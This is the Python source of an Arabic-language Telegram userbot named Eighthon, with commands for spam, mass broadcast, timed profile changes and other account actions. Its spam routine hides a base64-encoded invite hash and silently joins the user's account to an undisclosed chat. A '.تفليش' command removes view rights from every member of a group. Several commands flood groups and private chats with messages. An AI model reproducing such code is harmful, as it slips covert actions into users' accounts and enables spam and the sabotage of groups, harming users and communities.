from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *
from help import *
from config import *
from t06bot import *
from checktele import *
from yt import *

# -

eighthon.start()









LOGS = logging.getLogger(__name__)

DEVS = [
    5502537272, 5582470474
]
DEL_TIME_OUT = 10
normzltext = "𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟬"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["on"]
time_bio = ["on"]


async def join_channel():
    try:
        await eighthon(JoinChannelRequest("@Eighthon"))
    except BaseException:
        pass


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.تفليش"))
async def _(event):
    await event.delete()
    messagelocation = event.to_id
    async for user in eighthon.iter_participants(messagelocation):
        user_id = user.id
        try:
            await eighthon.edit_permissions(messagelocation, user_id, view_messages=False)
        except:
            pass


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.اكس او"))
async def _(event):
    bot = 'inlinegamesbot'
    xo = await eighthon.inline_query(bot, "")
    await xo[0].click(
        event.chat_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.السورس"))
async def a(event):
    await event.edit("جارٍ")
    animation = [
        progressbar[0],
        progressbar[1],
        progressbar[2],
        progressbar[3],
        progressbar[4],
        progressbar[5],
        progressbar[6],
        progressbar[7],
        progressbar[8],
        progressbar[9]
    ]
    for i in animation:
        time.sleep(0.3)
        await event.edit(i)
    await event.edit(soursce)



@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.ذاتية"))
async def _(event):
    if not event.is_reply:
        return await event.edit(
            "يستعمل الامر بالرد على الصورتهة او الفيديو !"
        )
    zq_lo = await event.get_reply_message()
    await event.delete()
    pic = await zq_lo.download_media()
    await eighthon.send_file(
        "me", pic, caption=f"تم حفظ الصورة او الفيديو الذاتي هنا : "
    )

@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.تكرار (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass



@eighthon.on(events.NewMessage(pattern=r"\.ادمن", outgoing=True))
async def _(event):
    if event.fwd_from:
        return
    result = await eighthon(functions.channels.GetAdminedPublicChannelsRequest())
    output_str = "انت ادمن في : \n"
    for channel_obj in result.chats:
        output_str += f"- {channel_obj.title} @{channel_obj.username} \n"
    await event.edit(output_str)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.سي (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.اشتراكاتي"))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.datetime.now()
    u = 0  # number of users
    g = 0  # number of basic groups
    c = 0  # number of super groups
    bc = 0  # number of channels
    b = 0  # number of bots
    await event.edit("يتم التعداد ..")
    async for d in eighthon.iter_dialogs(limit=None):
        if d.is_user:
            if d.entity.bot:
                b += 1
            else:
                u += 1
        elif d.is_channel:
            if d.entity.broadcast:
                bc += 1
            else:
                c += 1
        elif d.is_group:
            g += 1
        else:
            pass
            # logger.info(d.stringify())
    end = datetime.datetime.now()
    ms = (end - start).seconds
    await event.edit("""تم استخراجها في {} ثواني
`الاشخاص :\t{}
المجموعات العادية :\t{}
المجموعات الخارقة :\t{}
القنوات :\t{}
البوتات :\t{}
`""".format(ms, u, g, c, bc, b))
@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.المطور"))
async def _(event):
    photo = await eighthon.get_profile_photos(DEVS[0])
    await eighthon.send_file(event.chat_id, photo, caption=f'''
    The best !
      - @S_Z_H , @E_7_V
''', reply_to=event)
@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.انهاء الاسم الوقتي"))
async def _(event):
    await event.edit("تم انهاء الاسم الوقتي")
    time_name.clear()
    time_name.append("off")
    await eighthon(
        functions.account.UpdateProfileRequest(
            first_name="@Eighthon"
        )
    )


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.اسم وقتي"))
async def _(event):
    time_name.clear()
    time_name.append("on")
    await event.edit("تم تفعيل الاسم وقتي")
    while True:
        if time_name[0] == "off":
            break
        else:
            HM = time.strftime("%I:%M")
            for normal in HM:
                if normal in normzltext:
                    namefont = namerzfont[normzltext.index(normal)]
                    HM = HM.replace(normal, namefont)
            name = f"{HM}"
            LOGS.info(name)
            try:
                await eighthon(
                    functions.account.UpdateProfileRequest(
                        first_name=name
                    )
                )
            except FloodWaitError as ex:
                LOGS.warning(str(ex))
                await asyncio.sleep(ex.seconds)
            await asyncio.sleep(DEL_TIME_OUT)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.انهاء البايو الوقتي"))
async def _(event):
    await event.edit("تم انهاء البايو الوقتي")
    time_bio.clear()
    time_bio.append("off")
    await eighthon(
        functions.account.UpdateProfileRequest(
            about="@Eighthon"
        )
    )


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو وقتي"))
async def _(event):
    await event.delete()
    if event.fwd_from:
        return
    while True:
        if time_name[0] == "off":
            break
        else:
            HM = time.strftime("%I:%M")
            for normal in HM:
                if normal in normzltext:
                    namefont = namerzfont[normzltext.index(normal)]
                    HM = HM.replace(normal, namefont)
            bio = HM
            LOGS.info(bio)

        try:
            await eighthon(
                functions.account.UpdateProfileRequest(
                    about=bio
                )
            )
        except FloodWaitError as ex:
            LOGS.warning(str(ex))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو"))
async def _(event):
    user = (await event.get_sender()).id
    bio = await eighthon(functions.users.GetFullUserRequest(id=user))
    bio = bio.about
    await event.edit(f"`{bio}`")


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.غادر"))
async def leave(e):
    await e.edit("`حسنا سأغادر هذه المجموعة .`")
    time.sleep(1)
    if '-' in str(e.chat_id):
        await eighthon(LeaveChannelRequest(e.chat_id))
    else:
        await e.edit('` هذه ليست مجموعة !`')


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة كروب(?: |$)"))
async def gcast(event):
    sedthon = event.pattern_match.group(1)
    if eighthon:
        msg = eighthon
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                await event.client.send_message(chat, msg)
                done += 1
                asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة خاص(?: |$)(.*)"))
async def gucast(event):
    eighthon = event.pattern_match.group(1)
    if eighthon:
        msg = eighthon
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
                    asyncio.sleep(1)
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.السورس"))
async def _(event):
    await event.edit(soursce)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ الفحص...")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
**☆ Welcome to Source eighthon
☆ Version : 1.5
☆ Ping : `{ms}`
☆ ID : `{event.sender_id}`
☆ Source Eighthon : @Eighthon**
''')


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec4)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.م5"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec5)


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر الخاصة"))
async def _(event):
    if ispay2[0] == 'yes':
        await event.edit(spc2)
    elif ispay[0] == "yes":
        await event.edit(spc)
    else:
        await event.edit("يجب الدفع لاستعمال هذا الامر !")


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.البنك"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("جارٍ...")
    end = datetime.datetime.now()
    res = (end - start).microseconds / 1000
    await event.edit(f"""
`-- -- -- -- -- -- -- -- -- --`
- تمت الاستجابة
- البنك : `{res}`
`-- -- -- -- -- -- -- -- -- --`"""
                     )

ownersaif_id = 5582470474 or 5502537272
@eighthon.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownersaif_id :
        order = await event.reply('** Hi MY Developer - @S_Z_H , @E_7_V**')


	
@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.فك حظر"))
async def _(event):
    list = await eighthon(functions.contacts.GetBlockedRequest(offset=0, limit=1000000))
    if len(list.blocked) == 0:
        razan = await event.edit(f'ليس لديك اي شخص محظور !')
    else:
        unblocked_count = 1
        for user in list.blocked:
            UnBlock = await eighthon(functions.contacts.UnblockRequest(id=int(user.peer_id.user_id)))
            unblocked_count += 1
            razan = await event.edit(f'جارِ الغاء الحظر : {round((unblocked_count * 100) / len(list.blocked), 2)}%')
        unblocked_count = 1
        razan = await event.edit(f'تم الغاء حظر : {len(list.blocked)}')


@eighthon.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("• جارِ اعادة تشغيل السورس ..\n• انتضر 1-2 دقيقة  .")
    await eighthon.disconnect()
    await eighthon.send_message("me", "`اكتملت اعادة تشغيل السورس !`")


print("- سورس ايت ثون يعمل بنجــاح ..")
eighthon.run_until_disconnected()
